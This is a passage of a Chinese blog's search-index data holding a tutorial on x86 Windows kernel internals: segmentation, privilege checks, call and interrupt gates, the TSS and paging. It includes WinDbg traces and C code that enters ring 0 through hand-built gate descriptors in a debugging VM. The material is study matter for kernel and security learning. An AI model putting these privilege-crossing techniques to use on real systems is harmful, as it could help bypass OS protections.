pfn;\n&#125;\n","slug":"代码注入与拦截","date":"2020-06-21T07:47:31.000Z","categories_index":"Windows安全","tags_index":"Windows注入","author_index":"Akpigs"},{"id":"ebb230849b36768b2e4833fd7043c535","title":"内核基础","content":"分段机制\n在 32 位保护模式下，段寄存器就不会再直接保存段基址了，而是分成了可见的 16 位段选择子部分和不可见的 80 位高速缓冲部分，对于访问内存需要用到的一些信息，例如段的基址、限长和访问属性等都会被保存在这里的不可见部分。这一部分的内容无法人为的直接读取到，在段寄存器进行切换时会被 CPU 自动加载。首先，会解析 16 位的段选择子部分，从 TI 位获取到要使用的是哪一张表(GDT?LDT?)，由于Windows没有使用LDT，所以目前保存的都是 0，再从 INDEX 获取表内元素的下标，再进行权限检查后，从中加载段的信息到不可见的高速缓存部分。\n在16位上是段基址，在32位上是段选择子\n\n段选择子\n从下面的结构体定义可以看出，段选择子由 INDEX、TI 以及 RPL 组成，其中 RPL 全称为请求权限级别，表示当前使用什么样的权限发出请求，TI 位指定了当前查找的是 GDT(0) 还是 LDT(1)，INDEX 标识的是索引，需要将 index 配合 ti 位一起使用，找到最终的 段描述符。\n段选择子是一个16位的数值，高13位为全局描述表的索引，第三位索引GDT，LDT，低两位为请求特权级\n\ntypedef struct _SELECTOR \n&#123;\n    unsigned short index: 13;\t\t\t\t&#x2F;&#x2F; index 是存在于 GDT 或 LDT 中元素的索引\n\tunsigned short    ti:  1;\t\t\t\t&#x2F;&#x2F; 为 0 表示 GDT 否则是 LDT，windows 始终各为 0\n    unsigned short   rpl:  2;\t\t\t\t&#x2F;&#x2F; 请求权限级别，表示使用什么样的权限访问\n&#125;\n\n段描述符\nGDT 或 LDT 中保存的就是段描述符，每一个段描述符都描述了段的一些信息，32位下，大小为 8 字节(64位)\n在 windbg 中使用 gdtr 寄存器可以获取段描述符的基址，gdtl 获取段描述符的限长。\n通过汇编指令 rgdt 获取 gdt 寄存器，还可以通过 lgdt(特权指令) 设置 gdt 寄存器的内容。\n描述一个段的位置和大小信息以及访问控制的状态信息，存在GDTR寄存器指向的内存中\n\ntypedef struct _DESCRIPTOR\n&#123;\n    unsigned int limit1: 16;\t\t\t\t&#x2F;&#x2F; 段限长 [0~15]\n    unsigned int base1:  16;\t\t\t\t&#x2F;&#x2F; 段基址 [0~15]\n    unsigned int base2:   8;\t\t\t\t&#x2F;&#x2F; 段基址 [16~23]\n    unsigned int type:    4;\t\t\t\t&#x2F;&#x2F; 段的类型\n    unsigned int s:\t\t  1;\t\t\t    &#x2F;&#x2F; 当前是系统段还是用户段\n    unsigned int dpl:     2;                &#x2F;&#x2F; 访问当前段需要用到的权限\n    unsigned int p:       1;                &#x2F;&#x2F; 表示当前的段是否是有效的\n    unsigned int limit2:  4;                &#x2F;&#x2F; 段限长 [16~19]\n    unsigned int avl:     1;                &#x2F;&#x2F; 保留给操作系统的\n    unsigned int L:       1;                &#x2F;&#x2F; 是否是长模式\n    unsigned int db:      1;                &#x2F;&#x2F; 默认使用的单位\n    unsigned int G:       1;                &#x2F;&#x2F; 表示 limit 的单位\n    unsigned int base3:   8;                &#x2F;&#x2F; 段基址 [24~31]\n&#125;\n\n\n*Base: 由 3 个部分组成，分别对应了 32 位基址的 0 ~ 15、16 ~ 23 以及 24 ~ 31 位，表示段基地址\n\nP: 是切换寄存器时检查的第一个位，表示当前的段描述符是否是有效的，如果有效为 1，否则为 0\n\nAVL：对于 i386 的所有处理器来说，CPU 都不会使用它，会将它留给用户（操作）进行操作\n\nL: 如果当前的处理哦其处于 64 位模式，就会提供 L 位进行标识，表示当前使用的是长模式\n\n*DPL：目标请求级别，描述的是想要访问当前的段描述符必须拥有的权限，权限通常要小于RPL\\CPL，DPL是目标代码段的访问权限，CPL当前执行权限，RPL代码段权限\n\nLimit 和 G 位：Limit 由两个部分组成，共使用了 20 位的数据表示段限长，当 G 位为 0 时，Limit 的单位就是 1Byte，当 G 位为 1 时，Limit 的单位就是 0x1000(4KB)，所以Limit 的值最大可能是下面的情况\n\n若 G 为 1：假设 Limit 为 0xFFFFF，此时最终限长为 0xFFFFF × 0x1000 + 0xFFF -&gt; 0xFFFFFFFF\n若 G 为 0：假设 Limit 为 0xFFFFF，此时最终限长为 0xFFFFF × 1 -&gt; 0xFFFFF\n\n\nD\\B：用于设置默认操作数的大小和默认地址的大小。对于栈来说，通常将这一位成为 B 位，当 B 位为1时，默认对 ESP 的操作是以 4 字节计算的，例如 push 1 实际执行了 sub esp, 4 的操作。对于其它情况，该位被称作 D 位，表示默认使用的是 4 字节还是 2 字节。通过 OPCODE 指令前缀可以修改操作数和地址大小。\n当前是代码段时 D &#x3D; 1采用32位寻址方式,D &#x3D; 0 采用16位寻址方式\n当前是数据段是 D &#x3D; 1 无论是向上拓展还是向下都是4Gb, D&#x3D;0 它的拓展范围只有64kb\n\n\n\n\n用户段\n\n当 S 位为 1 时，表示当前就是用户段，用户段又存在了两种状态，分别是代码段和数据段，\nS位为0时，是系统，TYPE代表这个段的调用门，陷阱门，任务门\n\n如果 TYPE 位的最高位为 1，就表示当前是代码段，此时看到的 TYPE 整体会大于 7\nC: 表示当前是否是一致代码段。如果但其概念是一致代码段，就表示我们可以使用低权限访问高权限的内容。如果但其概念是非一致代码段，那么要求访问者个被访问者权限必须一致 。\nR: 当前的段是否是可读的\nA: 表示当前的段是否被访问了，如果被访问了就为 1\n\n\n如果 TYPE 位的最高位为 0，就表示当前是数据段，此时看到的 TYPE 整体会小于 8\nE: 表示当前是向上扩展(extend-up)段还是向下扩展(extend-down)段\n\nW: 表示当前的段是可写的\nA: 表示当前的段是否被访问了，如果被访问了就为 1\n\n手动解析\n0008 -&gt; 双机调试 CS &#x3D; 1(INDEX) + 0(TI) + 00(RPL)，通过 dq gdtr+(INDEX*8) 找到段描述符\n00cf9b00&#96;0000ffff: base 表示当前的段基址为 0\n00cf9b00&#96;0000ffff：limit 为 0xFFFFF，G位是C的最高位表示1，所以LIMIT 是 0xFFFFFFFF\n00cf9b00&#96;0000ffff：除了 G 位，分别为 DB(1)、L(0) 和 AVL(0)，只有 DB 是有意义的\n00cf9b00&#96;0000ffff：9对应了 P(1) + DPL(00) + S(1)，说明当前是一个有效的仅R0能访问的用户段\n00cf9b00&#96;0000ffff：b大于8，说明是代码段，三个属性分别是 0(非一致) 1(可读) 1(访问过)\n\n\n001b -&gt; 用户程序CS &#x3D; 11(INDEX) + 0(TI) + 11(RPL)，通过 dq gdtr+(INDEX*8) 找到段描述符\n00cffb00&#96;0000ffff：base 表示当前的段基址为 0\n00cffb00&#96;0000ffff：limit 为 0xFFFFF，G位是C的最高位表示1，所以LIMIT 是 0xFFFFFFFF\n00cffb00&#96;0000ffff：除了 G 位，分别为 DB(1)、L(0) 和 AVL(0)，只有 DB 是有意义的\n00cffb00&#96;0000ffff：F对应了 P(1) + DPL(11) + S(1)，说明当前是一个有效的需要R3能访问的用户段\n00cffb00&#96;0000ffff：b大于8，说明是代码段，三个属性分别是 0(非一致) 1(可读) 1(访问过)\n\n\n随便找的一个数据段，对应 TI 和 INDEX 分别是 0 和 10，DPL是0表示选择子最低两位应该是0\n00cf9300&#96;0000ffff：base 表示当前的段基址为 0\n00cf9300&#96;0000ffff：limit 为 0xFFFFF，G位是C的最高位表示1，所以LIMIT 是 0xFFFFFFFF\n00cf9300&#96;0000ffff：除了 G 位，分别为 DB(1)、L(0) 和 AVL(0)，只有 DB 是有意义的\n00cf9300&#96;0000ffff：9对应了 P(1) + DPL(00) + S(1)，说明当前是一个有效的仅R0能访问的用户段\n00cf9300&#96;0000ffff：3小于 7 是数据段，三个属性分别是 E(向上扩展) W(可写) A(访问了)\n\n\n\n权限检查\n通过 lxs 和 mov xs, ax 可以切换段选择子 加载段选择符进入段寄存器的时候\n\nCS寄存器只能存放代码段的选择符\n代码段选择符可以被加载到数据段寄存器，但是不可读的代码段选择符不能被加载进入数据段寄存器（因为数据段都是可读的）\n只有可读可写数据段选择符才能加载到SS寄存器（SS寄存器一定是可写的）\n\n\n当前接触到的三种权限：\n\nCPL：特指 CS 段寄存器的最低两位，表示当前所拥有(当前执行代码)的权限\n\n当前操作系统登录用户的权限\n\n\nRPL：指任何一个段选择子的最低两位，表示使用什么样的权限进行请求\n\n当前是否使用了管理员方式打开目标程序\n\n\nDPL：想要切换到当前的段描述符需要什么样的权限\n\n当前的应用程序最少需要使用什么样的权限\n\n\n代码间的跳转JMP 0x20:0x004183D7 CPU怎么指向这段代码\n\n段选择子拆分\n0x20对应二进制 0000 0000 0010 0000\nRPL &#x3D; 00\nTi &#x3D; 0\nIndex &#x3D; 4\n\n查表得到段描述符\nTi &#x3D; 0 所以查GDT表\nIndex &#x3D; 4 找到对应的段描述符\n四种情况可以跳转: 代码段,调用门,TSS任务段,任务门\n\n权限检查\n如果是非一致代码段,要求CPL &#x3D;&#x3D; DPL &amp;&amp; RPL &lt;&#x3D; DPL\n如果是一致代码段,要求CPL &gt;&#x3D; DPL\n\n加载段描述符\n通过上面的权限检查后,cpu会将段描述符加载到cs段寄存器中\n\n代码执行\ncpu将 cs.base + Offset 的值写入eip然后执行cs:eip处的代码,段间跳转结束\n\n\n调用门\n\n\n\n\n\n1100\n查看GDT表\nkd&gt; r gdtr\ngdtr&#x3D;80b95000\nkd&gt; r gdtl\ngdtl&#x3D;000003ff\n\n跨段调用调用提权\n\n\n调用不提权\n\n\n跨段调用时,一旦有权限切换,就会跟着切换栈\nCS的权限一旦改变,SS的权限也要随着改变,CS与SS的等级必须一样\nJMP FAR 只能跳转到同级的一致代码段,但CALL FAR可以通过调用门提权,提升CPL权限\n注: SS与ESP从那里来?参见TSS段\n调用门执行流程指令格式 CALL CS:EIP(EIP是废弃的)\n执行步骤:\n 根据CS的值查GDT表,找到对应的段描述符,这个描述符是一个调用门\n 在调用门描述符中存储另一个代码段的段选择子\n 选择子指向的段 段.Base + 偏移地址 就是真正要执行的地址\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\n\ntypedef struct _CALLGATE \n&#123;\n\tunsigned int offset1 : 16;\t\t\t\t&#x2F;&#x2F; 提权后执行代码的低地址\n\tunsigned int selector : 16;\t\t\t\t&#x2F;&#x2F; 需要提升的权限对应的选择子\n\tunsigned int paramcount : 5;\t\t\t&#x2F;&#x2F; 提权后执行的代码用到的参数\n\tunsigned int : 3;\t\t\t\t\t\t&#x2F;&#x2F; 保留位\n\tunsigned int type : 4;\t\t\t\t\t&#x2F;&#x2F; 对于调用门始终是 1100 \n\tunsigned int S : 1;\t\t\t\t\t\t&#x2F;&#x2F; 对于调用门始终是 0\n\tunsigned int DPL : 2;\t\t\t\t\t&#x2F;&#x2F; 访问我需要的权限，应该写 3\n\tunsigned int P : 1;\t\t\t\t\t\t&#x2F;&#x2F; 必须是有效的段描述符\n\tunsigned int offset2 : 16;\t\t\t\t&#x2F;&#x2F; 提权后执行代码的高地址\n&#125; CALLGATE, *PCALLGATE;\n\n&#x2F;&#x2F; 在进行权限切换的过程中，栈也会随之改变\nshort r0_ss &#x3D; 0;\nint r0_esp &#x3D; 0;\n\n&#x2F;&#x2F; 裸函数，只生成用户编写的代码，在其中操作高地址空间\n_declspec(naked) void r0_function()\n&#123;\n\t__asm\n\t&#123;\n\t\tint 3\n\t\tmov r0_ss, ss\t\t; 获取 r0 权限的 ss\n\t\tmov r0_esp, esp\t\t; 获取 r0 权限的 esp\n\t\tretf\t\t\t\t; 调用门必须使用 retf 进行返回\n\n\t\t; 实现通过调用门读取到 gdt 中的第 3 项\n\t\t; sgdt 可以获取 gdt 的地址\n\t\t; 对于中断门和陷阱门必须使用 iretd\n\t&#125;\n&#125;\n\nint main()\n&#123;\n\t&#x2F;&#x2F; 1. 根据当前函数的位置，构建一个调用门，用于进行跳转\n\t&#x2F;&#x2F; offset: 0045???? ????6c20\t-&gt; 需要跳转的偏移\n\t&#x2F;&#x2F; selector: ???????? 0008???? (1 0 00) -&gt;  需要切换的权限\n\t&#x2F;&#x2F; DPL: ????E??? ????????\t-&gt; 访问当前调用门的权限\n\t&#x2F;&#x2F; TYPE: ?????C?? ????????\t-&gt; 当前是一个调用门描述符\n\t&#x2F;&#x2F;00456BC0 00456BC0\n\t&#x2F;&#x2F; 0045EC00&#96;00086BC0\n\n\n\n\t&#x2F;&#x2F; 2. 构建一个远跳的地址，在远跳中，偏移是没有意义的，给什么都哦可以\n\t&#x2F;&#x2F;\t后面保存的是段选择子，可以用于找到调用门描述符，要求 RPL &lt;&#x3D; DPL\n\t&#x2F;&#x2F;\t- 0x004B -&gt; 01001(INDEX) 0(TI) 11(RPL)\n\tBYTE dest[] &#x3D; &#123; 0x00, 0x00, 0x00, 0x00, 0x4B, 0x00 &#125;;\n\t&#x2F;&#x2F;char dest[6] &#x3D; &#123;&#125;;\n\t&#x2F;&#x2F;*(DWORD*)&amp;dest[0] &#x3D; 0x12345678;\n\t&#x2F;&#x2F;*(DWORD*)&amp;dest[4] &#x3D; 0x48;\n\n\t&#x2F;&#x2F; 3. 使用 call far 语句，跳转到指定的调用门中，在进行R3到R0 的转化的\n\t&#x2F;&#x2F;\t时候 CPU 会默认的将用户 SS ESP CS IP 保存到栈中\n\t__asm push fs\n\t__asm call fword ptr dest;\n\t__asm pop fs\n\n\t&#x2F;&#x2F; 4. 输出 R0 下的 esp 和 ss，如果R0代码设置断点，那么 fs 会被改变，调\n\t&#x2F;&#x2F;\t用函数会崩溃，需要在进入门之前先进行保存\n\tprintf(&quot;%04X: %08X\\n&quot;, r0_ss, r0_esp);\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n将构造的门描述符填写到索引处,再将生成好到程序放到虚拟机中执行\n\n\n输入指令 g 直接运行\n\n\n注意，如果在返回时需要改变特权级，将会检查段寄存器DS、ES、FS、GS的内容，如果在它们之中，某个寄存器的中的选择子所指向的数据段描述符的DPL权限比返回后的CPL(CS.RPL)高,即数值上返回后的CPL&gt;数据断描述符的DPL,处理器将会把数值0填充到相应的段寄存器。\nIDT表IDT表概述IDT即中断描述符表,同GDT一样,IDT也是由一系列描述符组成,每个描述符占8个字节.但要注意的是,IDT表的第一个元素不是NULL\n在Windbg中查看IDT表的基址和长度\nkd&gt; r idtr\nidtr&#x3D;80b95400\nkd&gt; r idtl\nidtl&#x3D;000007ff\n\nIDT表构成IDT表可以包含三种门描述符:\niretd 返回\n中断门描述符中断门\n1110\n\n\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\n\n&#x2F;&#x2F; 在进行权限切换的过程中，栈也会随之改变\nshort r0_ss &#x3D; 0;\nint r0_esp &#x3D; 0;\n\n\n&#x2F;&#x2F; 裸函数，只生成用户编写的代码，在其中操作高地址空间\n_declspec(naked) void r0_function()\n&#123;\n\t__asm\n\t&#123;\n\t\t&#x2F;&#x2F;int 3\n\t\tmov r0_ss, ss; 获取 r0 权限的 ss\n\t\tmov r0_esp, esp; 获取 r0 权限的 esp\n\t\tiretd; \n\t&#125;\n&#125;\n\n\n\nint main()\n&#123;\n\t&#x2F;&#x2F;中断门\n\t&#x2F;&#x2F; 1. 根据当前函数的位置，构建一个中断门，用于进行跳转\n\t&#x2F;&#x2F; offset: 0045???? ????6c20\t-&gt; 需要跳转的偏移\n\t&#x2F;&#x2F; selector: ???????? 0008???? (1 0 00) -&gt;  需要切换的权限\n\t&#x2F;&#x2F; DPL: ????E??? ????????\t-&gt; 访问当前中断门的权限\n\t&#x2F;&#x2F; TYPE: ?????E?? ????????\t-&gt; 当前是一个中断门描述符\n\t&#x2F;&#x2F;制造中断,使其调用中断门描述符\n\t&#x2F;&#x2F;00456BC0\n\n\t&#x2F;&#x2F;0045EE0000086BC0\n\t_asm\n\t&#123;\n\t\tpush fs\n\t\tint 32\n\t\tpop fs\n\t&#125;\n\n\tprintf(&quot;%04X: %08X\\n&quot;, r0_ss, r0_esp);\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\n\n\n陷阱门描述符1111\n\n\n陷阱门与中断门的区别\n中断门执行时,将IF位清零,陷阱门\n任务门描述符在调用门,中断门与陷阱门中一旦出现权限切换,那么就会有堆栈切换.而且,由于CS的CPL发送改变,也导致了SS也必须切换,切换时,会有ESP和SS(CS是由中断门或者调用门指定)这2个值从TSS(Task-state segment),任务状态段\nTSSTSS是一块内存,大小104字节\n\n\n不要把TSS与任务切换联系到一起,TSS的意义就在于可以同时换掉一堆寄存器\nCPU怎么找到TSS,\nTR段寄存器\n\n\nTSS段描述符\n\n\n构造TSS段描述符:xx00e9xx&#96;xxxx0068\nTR寄存器读写\n1,将TSS段描述符加载到TR寄存器\n指令:LTR\n说明:用LTR指令去装载 仅仅是改变TR寄存器的值96位,并没有真正改变TSS,LTR指令只能在系统层使用,加载后TSS段描述符状态为会发生改变\n2,读TR寄存器\n指令:STR\n说明:如果用STR去读的花,只读了TR的16位,也就是选择子\n分页机制PDE与PTE80x86映射表分两级\n第一级:页目录表(PDT)\n第二级:页表(PTT)\n\n\n属性\n\nP位：\n 存在\nR&#x2F;W位：\n R&#x2F;W &#x3D; 0 只读\n R&#x2F;W &#x3D; 1 可读可写\nU&#x2F;S 位：\n U&#x2F;S &#x3D; 0 特权用户才能访问\n U&#x2F;S &#x3D; 1 普通用户特权用户都能访问\nP&#x2F;S 位：只对PDE有意义\n 当ps&#x3D;1时PDE直接指向物理页无PTE，低22位是页内偏移，页大小位4M\n 当ps&#x3D;0时，指向下一级页表\nD位：\n 是否被写过，写过就置为1\nWindows是通过页目录\n\n在 8086 CPU 下，我们是如何进行寻址的？\n我们使用 段寄存器:段内偏移 的形式访问一个物理地址，实际访问到的地址是：段寄存器*0x10+段内偏移，CPU所处的模式是实模式。\n\n在 80386 系列的 CPU 下，拥有几种 CPU 模式？\n三种。分别是实模式、保护模式以及虚拟8086模式。当计算机通电的时候，CPU肯定处于实模式，在进行一些初始化后，会切换到保护模式中。\n\n在保护模式下，我们是如何进行寻址的？我们使用 段寄存器:段内偏移 的形式访问一个虚拟地址，此时段寄存器保存的并不是段基址，而是段选择子，通过段选择子可以找到段描述符，在进行段选择子切换的时候，CPU会将段描述符中的部分内容加载到不可见的高速缓存部分，在实际寻址时，会使用这一部分的信息。\n\n当切换段选择子的时候，CPU会进行什么样的基本权限检查？CPL特指CS段的低两位，表示当前所拥有的权限、RPL指段选择子的低两位，表示当前使用的是什么权限、DPL表示想要访问指定段描述符所需要的权限，实际的权限检查公式为：MAX(CPL, RPL) &lt;&#x3D; DPL\n\n中断门或陷阱门保存在哪里，如何触发？中断门和陷阱门都应该由 IDT 进行处理，构建完成后，使用 int n 触发它，在进入中断门\\陷阱门后，使用 iretd 跳出到用户层。\n\n\n地址的种类\n\n逻辑地址：指 段寄存器+段内偏移 表示的一个地址。\n线性地址：指 进程独有虚拟内存空间中 的地址。 分段机制将逻辑地址转换为线性地址。\n物理地址：指 实际访问到的内存条 的地址。分页机制将线性地址转换为物理地址。\n\nWinDbg 相关指令\n!process 0 0: 列出当前系统中的所有进程的信息\n!process 0 0 notepad.exe： 列出指定进程的信息\n.process 进程的 EPROCESS: 切换到目标进程中，使用它的 CR3\ns -u 0x00000000 L0x1000000 “mmmmmwwwww”: 从指定位置开始搜索指定的字符串\n\n虚拟地址转换（无PAE）\nx86环境下，每一个进程都会拥有自己的 4GB 虚拟地址空间，主要由 CR3 进行区分\n\nCR3寄存器保存了每一个进程独有的页目录表(PDT)，页目录表是一个元素个数为 1024 的表，其中的每一项占有 4 个字节，叫做 页目录项（PDTE），页目录表项配合虚拟地址的高 10 位组成的索引可以寻址。\n寻址到的页目录表项，它的低12位保存的是属性位，除开属性位就是页表(PT)，页表是一个元素个数为1024 的表，其中的每一项占 4 字节，描述了一个页的信息\n\n\n找到了页表后，配合中间的10位，寻址到最终的页(PAGE)\n\n寻址过程\n\n\n0042d f48: 001 + 02d + f48\n\nkd&gt; !dd 5bdf1000  \t\t\t\t\t页目录表\n#5bdf1000 45031867 02b3e867 00000000 00000000\n#5bdf1010 03393867 3929e867 02ad9867 36deb867\n#5bdf1020 023ec867 09401867 32d03867 38a74867\n\nkd&gt; !dd 5bdf1000+(1*4)              页目录表项 -&gt; 页表\n#5bdf1004 02b3e867 00000000 00000000 03393867\n#5bdf1014 3929e867 02ad9867 36deb867 023ec867\n\nkd&gt; !dd 02b3e000+(4*2d)             页表 -&gt; 页\n# 2b3e0b4 019ac867 01406867 44608867 01209867\n# 2b3e0c4 0210a867 0251e867 02825867 00924867\n# 2b3e0d4 36e29867 37d28867 36d2f867 38930867\n\nkd&gt; !du 019ac000+f48                页 -&gt; 物理地址\n# 19acf48 &quot;1233211234567..F&quot;\n\n\n00130bd4： 000(页目录表索引) + 130(页表索引) + bd4(页内偏移)\n\nkd&gt; !dd 5bdf1000  \t\t\t\t\t页目录表\n#5bdf1000 45031867 02b3e867 00000000 00000000\n#5bdf1010 03393867 3929e867 02ad9867 36deb867\n#5bdf1020 023ec867 09401867 32d03867 38a74867\n\nkd&gt; !dd 5bdf1000+(0*4)\n#5bdf1000 45031867 02b3e867 00000000 00000000\n#5bdf1010 03393867 3929e867 02ad9867 36deb867\n#5bdf1020 023ec867 09401867 32d03867 38a74867\n\nkd&gt; !dd 45031000 + (4*130)\n#450314c0 376c5867 00000080 00000080 00000080\n#450314d0 028c7867 372c6867 00000080 00000080\n#450314e0 029c9867 01acd867 445c8867 028ce867\n\nkd&gt; !du 376c5000 + bd4\n#376c5bd4 &quot;1233211234567&quot;\n\n开启PAE的情况\n2：页目录表指针表(4) + 9:页目录表(512) + 9: 页表(512) + 12:偏移(0x1000)\n不管有没有开启 PAE，能够描述的页都是一样多的，但是和没有PAE的情况相比，开了的每一个项占了8字节空间，所以可以充分利用大于 4 GB的物理内存。\n\nkd&gt; !process 0 0 notepad.exe\nPROCESS 87bfbc00  SessionId: 1  Cid: 029c    Peb: 7ffd3000  ParentCid: 05ac\n    DirBase: 7f5fe560  ObjectTable: 90a553c8  HandleCount:  61.\n    Image: notepad.exe\n\n\n\nkd&gt; .process 87bfbc00\nImplicit process is now 87bfbc00\nWARNING: .cache forcedecodeuser is not enabled\n\n\n\nkd&gt; s -u 0x00000000 L0x01000000 &quot;1234567654321&quot;\n\n0040e100  0031 0032 0033 0034 0035 0036 0037 0036  1.2.3.4.5.6.7.6.\n01890bd4  0031 0032 0033 0034 0035 0036 0037 0036  1.2.3.4.5.6.7.6.\n\n\n0040e100 转换为二进制 \t\t00 000000010      000001110 \t\t  000100000000\n\t\t\t\t\t\t\t0\t\t  2\t\t\t\t e\t\t\t  100\nkd&gt; du 0040e100\n0040e100  &quot;1234567654321321&quot;\n\n\nkd&gt; !dq 7f5fe560\n#7f5fe560 00000000&#96;57f0c801 00000000&#96;5828d801\n#7f5fe570 00000000&#96;5838e801 00000000&#96;5860f801\n#7f5fe580 00000000&#96;78201801 00000000&#96;79182801\n#7f5fe590 00000000&#96;79103801 00000000&#96;79504801\n#7f5fe5a0 00000000&#96;7815c801 00000000&#96;77f5d801\n\n\n\nkd&gt; !dq 57f0c000+(2*8)\n#57f0c010 00000000&#96;58707867 00000000&#96;5825f867\n#57f0c020 00000000&#96;00000000 00000000&#96;00000000\n#57f0c030 00000000&#96;00000000 00000000&#96;00000000\n#57f0c040 00000000&#96;00000000 00000000&#96;582af867\n#57f0c050 00000000&#96;572ed867 00000000&#96;566bb867\n#57f0c060 00000000&#96;57851867 00000000&#96;00000000\n\n\n\n\nkd&gt; !dq 58707000 +(e*8)\n#58707070 80000000&#96;5762b867 80000000&#96;58069867\n#58707080 80000000&#96;56aea867 80000000&#96;570eb867\n#58707090 80000000&#96;57d6c867 80000000&#96;5796e867\n#587070a0 80000000&#96;5686f867 80000000&#96;57771867\n#587070b0 80000000&#96;56cf0867 80000000&#96;57b73867\n#587070c0 80000000&#96;571f2867 80000000&#96;57874867\n\n\n\nkd&gt; !du 5762b100\n#5762b100 &quot;1234567654321321&quot;\n\n&#x2F;&#x2F;第二个地址\n01890bd4  00 000001100 010010000 101111010100\n\t\t  0\t\t\tc    0x90\t\t\tbd4\n\nkd&gt; du 01890bd4\n01890bd4  &quot;1234567654321&quot;\n\n\n\nkd&gt; !dq 7f5fe560\n#7f5fe560 00000000&#96;57f0c801 00000000&#96;5828d801\n#7f5fe570 00000000&#96;5838e801 00000000&#96;5860f801\n#7f5fe580 00000000&#96;78201801 00000000&#96;79182801\n#7f5fe590 00000000&#96;79103801 00000000&#96;79504801\n#7f5fe5a0 00000000&#96;7815c801 00000000&#96;77f5d801\n\n\nkd&gt; !dq 57f0c000 + (0xc * 8)\n#57f0c060 00000000&#96;57851867 00000000&#96;00000000\n#57f0c070 00000000&#96;5810d867 00000000&#96;5848f867\n#57f0c080 00000000&#96;5860e867 00000000&#96;00000000\n#57f0c090 00000000&#96;580a6867 00000000&#96;57628867\n#57f0c0a0 00000000&#96;58329867 00000000&#96;00000000\n\n\nkd&gt; !dq 57851000 + (0x90 * 8)\n#57851480 80000000&#96;587e6867 00000000&#96;00000080\n#57851490 00000000&#96;00000080 00000000&#96;00000080\n#578514a0 80000000&#96;584e8867 80000000&#96;57ae7867\n#578514b0 00000000&#96;00000080 00000000&#96;00000080\n\n\nkd&gt; !du 587e6000 + 0xbd4\n#587e6bd4 &quot;1234567654321&quot;\n\n补充内容控制寄存器CPU中有一系列控制寄存器用于控制和确定CPU的保护模式，CR0-CR4\nCR1 保留\nCR3页目录基址\nCR0寄存器\n\n\n31\n30\n29\n28-19\n18\n17\n16\n15-6\n5\n4\n3\n2\n1\n0\n\n\n\nPG\nCD\nNW\n\nAM\n\nWP\n\nNE\nET\nTS\nEM\nMP\nPE\n\n\nPE：CR0的0位是启用保护（Protection Enable）标志\n PE &#x3D; 1保护模式 PE &#x3D; 0 实地址模式这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么PE和PG都要置位\nPG：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或同时开启了PE标志\n PG &#x3D; 0 且PE &#x3D; 0 处理器工作在实地址模式下\n PG &#x3D; 0 且PE &#x3D; 1处理器工作在没有开启分页机制的保护模式下（没有这种操作系统）\n PG &#x3D; 1 且PE &#x3D; 0在PE没有开启的情况下，无法开启PG\n PG &#x3D; 1 且PE &#x3D; 1处理器工作在开启了分页机制的保护模式下（也就是我们的操作系统）\nCR2寄存器当CPU访问莫格无效页面时，会产生缺页现象，此时，CPU会将引起异常的线性地址存放在CR2中\nCR4寄存器\n\n\n31-11\n10\n9\n8\n7\n6\n5\n4\n3\n2\n1\n0\n\n\n\n保留位（置0）\n\n\nPCE\nPGE\nMCE\nPAE\nPSE\nDE\nTSD\nPVI\nVME\n\n\nPAE&#x2F;PSE:\nPAE &#x3D; 1 是PAE分页 PAE &#x3D; 0 是普通分页\nMSR寄存器CPU中有一组寄存器，称之为特殊模块寄存器，这类寄存器数量庞大，功能各异：\n 性能监视计数\n 调试扩展支持\n 机器检查\n 功耗与温控管理\n 特殊指令的支持\n 处理器特性和处理器莫斯支持\n每一个MSR寄存器都有它的编号可以使用下面的指令分别对其读写，一下指令只能在0环特权级才能执行\n rdmsr： ecx 存放序号，执行完后数据存放在eax中\n wrmsr： eax 存放数据，ecx存放序号，执行后将eax写入到相应的寄存器\n总结发明保护模式是为了进行多任务设计，避免任务之间相互干扰，保护模式实现的是通过分段和分页机制来进行的。通过设置CR0的PE标志位可以让处理器工作在保护模式下，PG位可以开启分页保护机制。\n通过分段保护机制，处理器使用段寄存器中选择符（RPL和CPL）和段描述符各个字段来执行保护验证。\n对于分页机制，主要用页目录和页表项中的R&#x2F;W和U&#x2F;S标志来实现保护操作，VirtualProtect函数就是通过修改R&#x2F;W来修改分页的读写属性\n","slug":"内核基础","date":"2019-05-24T08:06:18.000Z","categories_index":"内核","tags_index":"内核基础","author_index":"Akpigs"}]